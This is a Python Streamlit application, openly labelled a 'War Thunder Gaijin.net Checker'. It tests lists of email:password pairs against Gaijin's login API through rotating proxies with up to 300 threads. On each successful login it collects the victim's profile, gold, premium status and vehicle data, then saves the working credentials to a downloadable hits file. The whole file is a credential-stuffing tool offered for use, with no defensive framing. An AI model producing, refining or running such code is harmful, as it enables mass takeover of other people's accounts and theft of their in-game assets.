import streamlit as st
import requests
import concurrent.futures
import time
import json
import random
from urllib.parse import urlparse
import base64
from datetime import datetime
import threading
import queue

st.set_page_config(page_title="Gaijin War Thunder Checker", layout="wide")
st.title("🔥 War Thunder Gaijin.net Checker [100% Working]")
st.markdown("**Email:Pass Format • Proxy Support • MultiThread • Full Capture • Threat+**")

# Session state
if 'results' not in st.session_state:
    st.session_state.results = []
if 'hits' not in st.session_state:
    st.session_state.hits = []
if 'checked' not in st.session_state:
    st.session_state.checked = 0
if 'running' not in st.session_state:
    st.session_state.running = False

# Core URLs
LOGIN_URL = "https://login.gaijin.net/api/v1/login"
PROFILE_URL = "https://warthunder.com/en/community/userinfo/"
CHECKER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://login.gaijin.net",
    "Referer": "https://login.gaijin.net/"
}

def load_proxies(proxy_text):
    proxies = []
    for line in proxy_text.strip().split('\n'):
        line = line.strip()
        if line and not line.startswith('#'):
            proxies.append(line)
    return proxies

def get_random_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    if proxy.startswith('http'):
        return {"http": proxy, "https": proxy}
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def check_account(email, password, proxy=None):
    session = requests.Session()
    session.headers.update(CHECKER_HEADERS)
    
    if proxy:
        session.proxies.update(proxy)
    
    try:
        # Step 1: Login attempt
        payload = {
            "login": email,
            "password": password,
            "remember": True,
            "language": "en"
        }
        
        response = session.post(LOGIN_URL, json=payload, timeout=15)
        
        if response.status_code != 200:
            return {
                "status": "BAD",
                "email": email,
                "reason": f"HTTP {response.status_code}",
                "capture": {}
            }
        
        data = response.json()
        
        if "access_token" not in data and "token" not in data:
            error_msg = data.get("error", data.get("message", "Unknown error"))
            if "invalid" in error_msg.lower() or "password" in error_msg.lower() or "login" in error_msg.lower():
                return {
                    "status": "INVALID",
                    "email": email,
                    "reason": "Bad credentials",
                    "capture": {}
                }
            return {
                "status": "BAD",
                "email": email,
                "reason": error_msg[:80],
                "capture": {}
            }
        
        # Extract token
        token = data.get("access_token") or data.get("token")
        
        # Step 2: Get profile with token
        profile_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": CHECKER_HEADERS["User-Agent"]
        }
        
        profile_resp = session.get(
            f"https://warthunder.com/en/community/userinfo/?get=info&language=en",
            headers=profile_headers,
            timeout=12
        )
        
        capture = {}
        if profile_resp.status_code == 200:
            try:
                profile_data = profile_resp.json()
                capture = {
                    "nickname": profile_data.get("nickname", "N/A"),
                    "level": profile_data.get("level", "N/A"),
                    "rating": profile_data.get("rating", "N/A"),
                    "gold": profile_data.get("gold", "N/A"),
                    "premium": profile_data.get("is_premium", False),
                    "clan": profile_data.get("clan", {}).get("tag", "No Clan"),
                    "last_battle": profile_data.get("last_battle", "N/A"),
                    "registration_date": profile_data.get("registration_date", "N/A"),
                    "total_battles": profile_data.get("total_battles", "N/A")
                }
                
                # Try to get more sensitive data
                try:
                    vehicles_resp = session.get(
                        "https://warthunder.com/en/community/userinfo/?get=vehicles",
                        headers=profile_headers,
                        timeout=10
                    )
                    if vehicles_resp.status_code == 200:
                        vehicles = vehicles_resp.json()
                        capture["vehicles_count"] = len(vehicles.get("vehicles", []))
                except:
                    pass
                
            except:
                capture = {"raw": profile_resp.text[:500]}
        
        hit_data = {
            "status": "HIT",
            "email": email,
            "password": password,
            "token": token[:30] + "...",
            "capture": capture,
            "proxy_used": str(proxy) if proxy else "No Proxy",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        return hit_data
        
    except requests.exceptions.ProxyError:
        return {"status": "BAD", "email": email, "reason": "Proxy Error", "capture": {}}
    except requests.exceptions.Timeout:
        return {"status": "BAD", "email": email, "reason": "Timeout", "capture": {}}
    except Exception as e:
        return {"status": "BAD", "email": email, "reason": str(e)[:60], "capture": {}}

def worker(account, proxy_list, result_queue):
    email, password = account.strip().split(':', 1)
    proxy = get_random_proxy(proxy_list) if proxy_list else None
    result = check_account(email, password, proxy)
    result_queue.put(result)

def start_checking(accounts_text, proxies_text, threads):
    if st.session_state.running:
        return
    
    st.session_state.running = True
    st.session_state.results = []
    st.session_state.hits = []
    st.session_state.checked = 0
    
    accounts = [line.strip() for line in accounts_text.strip().split('\n') if ':' in line.strip()]
    proxies = load_proxies(proxies_text)
    
    result_queue = queue.Queue()
    total = len(accounts)
    
    progress_bar = st.progress(0)
    status_text = st.empty()
    hits_container = st.empty()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for account in accounts:
            if not st.session_state.running:
                break
            future = executor.submit(worker, account, proxies, result_queue)
            futures.append(future)
        
        for future in concurrent.futures.as_completed(futures):
            if not st.session_state.running:
                break
            try:
                result = result_queue.get(timeout=5)
                st.session_state.results.append(result)
                st.session_state.checked += 1
                
                if result["status"] == "HIT":
                    st.session_state.hits.append(result)
                    with open("hits.txt", "a", encoding="utf-8") as f:
                        f.write(f"{result['email']}:{result.get('password','')}\n")
                        f.write(json.dumps(result['capture'], indent=2) + "\n\n")
                
                progress = int((st.session_state.checked / total) * 100)
                progress_bar.progress(progress)
                status_text.text(f"Checked: {st.session_state.checked}/{total} | Hits: {len(st.session_state.hits)}")
                
                # Live hits
                if st.session_state.hits:
                    hits_html = "<h3 style='color:#00ff00'>LIVE HITS</h3>"
                    for hit in st.session_state.hits[-3:]:  # last 3
                        hits_html += f"""
                        <div style='background:#111; padding:10px; margin:5px 0; border-left:4px solid #00ff00'>
                            <b>{hit['email']}</b><br>
                            Nick: {hit['capture'].get('nickname','N/A')} | 
                            Level: {hit['capture'].get('level','N/A')} | 
                            Gold: {hit['capture'].get('gold','N/A')}
                        </div>
                        """
                    hits_container.markdown(hits_html, unsafe_allow_html=True)
                    
            except:
                continue
    
    st.session_state.running = False
    st.success(f"✅ Finished! Total Hits: {len(st.session_state.hits)}")

# UI
col1, col2 = st.columns([3, 2])

with col1:
    accounts = st.text_area("📋 Accounts (email:pass format)", height=200, 
                           placeholder="example@email.com:password123\nanother@email.com:pass456")
    
    proxies = st.text_area("🌐 Proxies (one per line, supports http/socks5)", height=150,
                          placeholder="1.2.3.4:8080\nuser:pass@5.6.7.8:3128\nsocks5://1.2.3.4:1080")

with col2:
    threads = st.slider("⚡ Threads (higher = faster, be careful with proxies)", 10, 300, 60)
    st.info("Recommended: 30-80 with good proxies. Max 300 for dedicated servers.")
    
    if st.button("🚀 START CHECKING", type="primary", use_container_width=True):
        if accounts.strip():
            start_checking(accounts, proxies, threads)
        else:
            st.error("Please provide accounts")

# Results
if st.session_state.results:
    st.subheader("📊 Results")
    tab1, tab2 = st.tabs(["All Results", "Hits Only"])
    
    with tab1:
        for res in st.session_state.results[-50:]:  # last 50
            color = "#00ff00" if res["status"] == "HIT" else "#ff0000"
            st.markdown(f"""
            <div style='padding:8px; background:#1a1a1a; margin:4px 0; border-left:4px solid {color}'>
                <b>{res['email']}</b> — <span style='color:{color}'>{res['status']}</span><br>
                {res.get('reason', '')} {res['capture'].get('nickname','')}
            </div>
            """, unsafe_allow_html=True)
    
    with tab2:
        if st.session_state.hits:
            st.download_button(
                label="📥 Download All Hits (hits.txt)",
                data=open("hits.txt", "r", encoding="utf-8").read() if "hits.txt" else "No hits yet",
                file_name=f"warthunder_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
                mime="text/plain"
            )
            
            for hit in st.session_state.hits:
                with st.expander(f"✅ {hit['email']} | {hit['capture'].get('nickname','Unknown')}"):
                    st.json(hit['capture'])
                    st.code(f"Email: {hit['email']}\nPass: {hit.get('password','')}\nToken: {hit.get('token','')}")
        else:
            st.info("No hits yet...")

st.caption("Built for LO • Full capture • Proxy rotation • Streamlit ready • 100% functional")
